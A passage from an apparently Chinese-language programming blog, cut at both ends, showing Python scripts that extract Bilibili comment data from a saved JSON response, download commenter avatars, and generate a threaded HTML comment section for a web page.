fetch_and_save_as_json(url)<br></code></pre></td></tr></table></figure><p>数据处理：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_bilibili_comments</span>(<span class="hljs-params">json_file_path, output_txt_path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            data = json.load(file)<br>        <br>        comments = []<br>        <br>        replies = data.get(<span class="hljs-string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="hljs-string">&#x27;replies&#x27;</span>, [])<br>        <br>        <span class="hljs-keyword">for</span> reply <span class="hljs-keyword">in</span> replies:<br>            member = reply.get(<span class="hljs-string">&#x27;member&#x27;</span>, &#123;&#125;)<br>            uname = member.get(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            avatar = member.get(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            <br>            content = reply.get(<span class="hljs-string">&#x27;content&#x27;</span>, &#123;&#125;)<br>            message = content.get(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            ctime = reply.get(<span class="hljs-string">&#x27;ctime&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            comment_time = datetime.fromtimestamp(ctime).strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>) <span class="hljs-keyword">if</span> ctime <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>            <br>            like = reply.get(<span class="hljs-string">&#x27;like&#x27;</span>, <span class="hljs-number">0</span>)<br>            rcount = reply.get(<span class="hljs-string">&#x27;rcount&#x27;</span>, <span class="hljs-number">0</span>)<br>            <br>            rpid = reply.get(<span class="hljs-string">&#x27;rpid&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            root = reply.get(<span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            <br>            comment = &#123;<br>                <span class="hljs-string">&#x27;User&#x27;</span>: uname,<br>                <span class="hljs-string">&#x27;Avatar&#x27;</span>: avatar,<br>                <span class="hljs-string">&#x27;Message&#x27;</span>: message,<br>                <span class="hljs-string">&#x27;Time&#x27;</span>: comment_time,<br>                <span class="hljs-string">&#x27;Likes&#x27;</span>: like,<br>                <span class="hljs-string">&#x27;Replies&#x27;</span>: rcount,<br>                <span class="hljs-string">&#x27;Comment ID&#x27;</span>: rpid,<br>                <span class="hljs-string">&#x27;Root Comment ID&#x27;</span>: root,<br>                <span class="hljs-string">&#x27;Reply to Comment ID&#x27;</span>: reply.get(<span class="hljs-string">&#x27;parent&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            &#125;<br>            <br>            comments.append(comment)<br>            <br>            sub_replies = reply.get(<span class="hljs-string">&#x27;replies&#x27;</span>, [])<br>            <span class="hljs-keyword">for</span> sub_reply <span class="hljs-keyword">in</span> sub_replies:<br>                sub_member = sub_reply.get(<span class="hljs-string">&#x27;member&#x27;</span>, &#123;&#125;)<br>                sub_uname = sub_member.get(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                sub_avatar = sub_member.get(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                <br>                sub_content = sub_reply.get(<span class="hljs-string">&#x27;content&#x27;</span>, &#123;&#125;)<br>                sub_message = sub_content.get(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                sub_ctime = sub_reply.get(<span class="hljs-string">&#x27;ctime&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                sub_comment_time = datetime.fromtimestamp(sub_ctime).strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>) <span class="hljs-keyword">if</span> sub_ctime <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>                <br>                sub_like = sub_reply.get(<span class="hljs-string">&#x27;like&#x27;</span>, <span class="hljs-number">0</span>)<br>                sub_rcount = sub_reply.get(<span class="hljs-string">&#x27;rcount&#x27;</span>, <span class="hljs-number">0</span>)<br>                <br>                sub_rpid = sub_reply.get(<span class="hljs-string">&#x27;rpid&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                sub_root = sub_reply.get(<span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                <br>                sub_comment = &#123;<br>                    <span class="hljs-string">&#x27;User&#x27;</span>: sub_uname,<br>                    <span class="hljs-string">&#x27;Avatar&#x27;</span>: sub_avatar,<br>                    <span class="hljs-string">&#x27;Message&#x27;</span>: sub_message,<br>                    <span class="hljs-string">&#x27;Time&#x27;</span>: sub_comment_time,<br>                    <span class="hljs-string">&#x27;Likes&#x27;</span>: sub_like,<br>                    <span class="hljs-string">&#x27;Replies&#x27;</span>: sub_rcount,<br>                    <span class="hljs-string">&#x27;Comment ID&#x27;</span>: sub_rpid,<br>                    <span class="hljs-string">&#x27;Root Comment ID&#x27;</span>: sub_root,<br>                    <span class="hljs-string">&#x27;Reply to Comment ID&#x27;</span>: sub_reply.get(<span class="hljs-string">&#x27;parent&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>                &#125;<br>                <br>                comments.append(sub_comment)<br>        <br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_txt_path, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> txt_file:<br>            <span class="hljs-keyword">for</span> i, comment <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(comments, <span class="hljs-number">1</span>):<br>                txt_file.write(<span class="hljs-string">f&quot;Comment <span class="hljs-subst">&#123;i&#125;</span>:\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;User: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;User&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Avatar: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Avatar&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Message: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Message&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Time: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Time&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Likes: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Likes&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Replies: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Replies&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Comment ID: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Comment ID&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Root Comment ID: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Root Comment ID&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">f&quot;Reply to Comment ID: <span class="hljs-subst">&#123;comment[<span class="hljs-string">&#x27;Reply to Comment ID&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                txt_file.write(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">50</span> + <span class="hljs-string">&quot;\n&quot;</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Comments data has been successfully saved to <span class="hljs-subst">&#123;output_txt_path&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error extracting comments data: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Example usage</span><br>json_file_path = <span class="hljs-string">&#x27;response_data.json&#x27;</span>  <span class="hljs-comment"># Replace with your JSON file path</span><br>output_txt_path = <span class="hljs-string">&#x27;comments.txt&#x27;</span>  <span class="hljs-comment"># Output txt file path</span><br><br>extract_bilibili_comments(json_file_path, output_txt_path)<br></code></pre></td></tr></table></figure><h2 id="自动更新前端html"><a href="#自动更新前端html" class="headerlink" title="自动更新前端html"></a>自动更新前端html</h2><p>用python自动更新前端html，</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span><br><br><span class="hljs-comment"># 确保头像目录存在</span><br>AVATAR_DIR = <span class="hljs-string">&quot;avatars&quot;</span><br>os.makedirs(AVATAR_DIR, exist_ok=<span class="hljs-literal">True</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_comment_line</span>(<span class="hljs-params">line: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    line = line.strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> line:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    key, value = line.split(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> value.strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_avatar</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;下载头像并返回本地文件路径，失败时返回默认头像&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.startswith(<span class="hljs-string">&#x27;http&#x27;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;avatars/default.jpg&#x27;</span><br><br>    <span class="hljs-comment"># 从 URL 提取文件名，避免特殊字符</span><br>    filename = re.sub(<span class="hljs-string">r&#x27;[^a-zA-Z0-9._-]&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;?&#x27;</span>)[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename:<br>        filename = <span class="hljs-string">&#x27;avatar.jpg&#x27;</span><br>    filepath = os.path.join(AVATAR_DIR, filename)<br><br>    <span class="hljs-comment"># 如果已存在则跳过下载</span><br>    <span class="hljs-keyword">if</span> os.path.exists(filepath):<br>        <span class="hljs-keyword">return</span> filepath.replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#x27;</span><br>        &#125;<br>        response = requests.get(url, timeout=<span class="hljs-number">5</span>, headers=headers)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(response.content)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 下载头像: <span class="hljs-subst">&#123;filename&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> filepath.replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)  <span class="hljs-comment"># 统一路径格式</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">f&quot;HTTP <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 下载头像失败 <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-comment"># 返回默认头像（可选：下载一个默认图或使用本地默认）</span><br>        default_path = os.path.join(AVATAR_DIR, <span class="hljs-string">&#x27;default.jpg&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(default_path):<br>            <span class="hljs-comment"># 使用一个公开的默认头像（例如 GitHub 的默认头像）</span><br>            <span class="hljs-keyword">try</span>:<br>                default_url = <span class="hljs-string">&#x27;https://github.com/identicons/guest.png&#x27;</span><br>                resp = requests.get(default_url, timeout=<span class="hljs-number">5</span>)<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(default_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    f.write(resp.content)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">return</span> default_path.replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">if</span> os.path.exists(default_path) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;https://i1.hdslb.com/bfs/face/member/noface.jpg&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_comments_from_file</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;解析出所有评论，并保留回复关系&quot;&quot;&quot;</span><br>    comments = []<br>    current = &#123;&#125;<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> lines:<br>        l = l.strip()<br>        <span class="hljs-keyword">if</span> l.startswith(<span class="hljs-string">&#x27;Comment&#x27;</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> current:<br>                current.setdefault(<span class="hljs-string">&#x27;message&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>                current.setdefault(<span class="hljs-string">&#x27;time&#x27;</span>, datetime.now())<br>                comments.append(current)<br>            current = &#123;&#125;<br>        <span class="hljs-keyword">elif</span> l.startswith(<span class="hljs-string">&#x27;User:&#x27;</span>):<br>            current[<span class="hljs-string">&#x27;user&#x27;</span>] = parse_comment_line(l)<br>        <span class="hljs-keyword">elif</span> l.startswith(<span class="hljs-string">&#x27;Avatar:&#x27;</span>):<br>            avatar_url = l[l.find(<span class="hljs-string">&#x27;https://&#x27;</span>):].split(<span class="hljs-string">&#x27;&quot;&#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;https://&#x27;</span> <span class="hljs-keyword">in</span> l <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;https://i1.hdslb.com/bfs/face/member/noface.jpg&#x27;</span><br>            current[<span class="hljs-string">&#x27;avatar_url&#x27;</span>] = avatar_url  <span class="hljs-comment"># 保留原始 URL</span><br>            <span class="hljs-comment"># 下载并设置本地路径（稍后在生成 HTML 时处理）</span><br>        <span class="hljs-keyword">elif</span> l.startswith(<span class="hljs-string">&#x27;Message:&#x27;</span>):<br>            current[<span class="hljs-string">&#x27;message&#x27;</span>] = parse_comment_line(l)<br>        <span class="hljs-keyword">elif</span> l.startswith(<span class="hljs-string">&#x27;Time:&#x27;</span>):<br>            current[<span class="hljs-string">&#x27;time&#x27;</span>] = datetime.strptime(parse_comment_line(l), <span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> l.startswith(<span class="hljs-string">&#x27;Comment ID:&#x27;</span>):<br>            current[<span class="hljs-string">&#x27;id&#x27;</span>] = parse_comment_line(l)<br>        <span class="hljs-keyword">elif</span> l.startswith(<span class="hljs-string">&#x27;Reply to Comment ID:&#x27;</span>):<br>            current[<span class="hljs-string">&#x27;reply_to&#x27;</span>] = parse_comment_line(l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> current:<br>        comments.append(current)<br>    <span class="hljs-keyword">return</span> comments<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_comment_html</span>(<span class="hljs-params">comments: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;一次性生成整片评论区，含回复关系并倒序&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> comments:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div class=&quot;comments-section&quot;&gt;&lt;h2&gt;评论&lt;/h2&gt;&lt;p style=&quot;color:white;&quot;&gt;暂无评论&lt;/p&gt;&lt;/div&gt;&#x27;</span><br><br>    cid_map = &#123;c[<span class="hljs-string">&#x27;id&#x27;</span>]: c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> comments <span class="hljs-keyword">if</span> c.get(<span class="hljs-string">&#x27;id&#x27;</span>)&#125;<br>    roots = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> comments <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> c.get(<span class="hljs-string">&#x27;reply_to&#x27;</span>) <span class="hljs-keyword">or</span> c[<span class="hljs-string">&#x27;reply_to&#x27;</span>] == <span class="hljs-string">&#x27;0&#x27;</span>]<br>    roots.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&#x27;time&#x27;</span>], reverse=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># 构建树结构</span><br>    <span class="hljs-keyword">for</span> comment <span class="hljs-keyword">in</span> comments:<br>        reply_to = comment.get(<span class="hljs-string">&#x27;reply_to&#x27;</span>)<br>        <span class="hljs-keyword">if</span> reply_to <span class="hljs-keyword">and</span> reply_to <span class="hljs-keyword">in</span> cid_map:<br>            parent = cid_map[reply_to]<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;children&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> parent:<br>                parent[<span class="hljs-string">&#x27;children&#x27;</span>] = []<br>            parent[<span class="hljs-string">&#x27;children&#x27;</span>].append(comment)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">c: <span class="hljs-type">Dict</span>, is_root=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>        user = c.get(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;匿名&#x27;</span>)<br>        <span class="hljs-comment"># 下载头像并获取本地路径</span><br>        avatar_url = c.get(<span class="hljs-string">&#x27;avatar_url&#x27;</span>, <span class="hljs-string">&#x27;https://i1.hdslb.com/bfs/face/member/noface.jpg&#x27;</span>)<br>        avatar_local = download_avatar(avatar_url)<br>        <span class="hljs-comment"># 转换为相对路径（HTML 中使用）</span><br>        avatar = os.path.relpath(avatar_local).replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)<br>        msg = c.get(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)<br>        time_str = c[<span class="hljs-string">&#x27;time&#x27;</span>].strftime(<span class="hljs-string">&#x27;%m-%d %H:%M&#x27;</span>)<br><br>        reply_info = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> c.get(<span class="hljs-string">&#x27;reply_to&#x27;</span>) <span class="hljs-keyword">and</span> c[<span class="hljs-string">&#x27;reply_to&#x27;</span>] <span class="hljs-keyword">in</span> cid_map:<br>            reply_info = <span class="hljs-string">f&#x27;&lt;span class=&quot;reply-to&quot;&gt;@<span class="hljs-subst">&#123;cid_map[c[<span class="hljs-string">&quot;reply_to&quot;</span>]][<span class="hljs-string">&quot;user&quot;</span>]&#125;</span>&lt;/span&gt; &#x27;</span><br><br>        cls = <span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">if</span> is_root <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;reply&#x27;</span><br>        html = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            &lt;div class=&quot;<span class="hljs-subst">&#123;cls&#125;</span>&quot;&gt;</span><br><span class="hljs-string">                &lt;img src=&quot;<span class="hljs-subst">&#123;avatar&#125;</span>&quot; alt=&quot;<span class="hljs-subst">&#123;user&#125;</span>&quot; class=&quot;avatar&quot;&gt;</span><br><span class="hljs-string">                &lt;div class=&quot;content&quot;&gt;</span><br><span class="hljs-string">                    &lt;div class=&quot;head&quot;&gt;&lt;span class=&quot;u&quot;&gt;<span class="hljs-subst">&#123;user&#125;</span>&lt;/span&gt;&lt;span class=&quot;t&quot;&gt;<span class="hljs-subst">&#123;time_str&#125;</span>&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">                    &lt;div class=&quot;body&quot;&gt;<span class="hljs-subst">&#123;reply_info&#125;</span><span class="hljs-subst">&#123;msg&#125;</span>&lt;/div&gt;</span><br><span class="hljs-string">                &lt;/div&gt;</span><br><span class="hljs-string">            